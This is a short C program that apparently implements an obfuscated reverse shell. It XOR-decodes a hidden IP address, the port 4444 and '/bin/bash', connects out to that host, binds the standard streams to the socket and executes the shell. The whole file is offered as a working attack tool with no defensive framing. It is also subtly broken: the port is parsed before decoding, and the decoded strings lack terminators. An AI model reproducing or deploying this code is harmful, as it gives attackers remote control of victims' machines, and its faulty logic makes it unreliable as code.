#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>


char* encrypt_decrpyt(char* plain, int plainLen, const char* key, int keyLen) {
    char* encr = (char*)malloc(sizeof (char )* plainLen);
    for(int i = 0; i < strlen(plain); i++) {
        encr[i] = plain[i] ^ key[i % keyLen];
    }
    return encr;
}

int main() {
    char address[] = {92,88,94,89,80,68,93,67,80,92,89,84, 00};
    char key[] = "malware";
    char port[] = {89, 85, 88, 67, 00};
    char process[] = {66, 3, 5, 25, 78, 16, 4, 30, 9, 00};

    int lenAddr = strlen(address);
    int lenPort = strlen(port);
    int lenProcess = strlen(process);

    char* decrypted_addr = encrypt_decrpyt(address, lenAddr, key, strlen(key));
    char* decrypted_port = encrypt_decrpyt(port, lenPort, key, strlen(key));
    char* decrypted_process = encrypt_decrpyt(process, lenProcess, key, strlen(key));
    printf("%s\n", decrypted_addr);
    printf("%s\n", decrypted_port);
    printf("%s\n", decrypted_process);

    struct sockaddr_in addr;
    int sockfd;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = inet_addr(decrypted_addr);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    dup2(sockfd, 0); //stdin
    dup2(sockfd, 1); //stdout
    dup2(sockfd, 2); //stderr
    execve(decrypted_process, NULL, NULL);
    return 0;
}


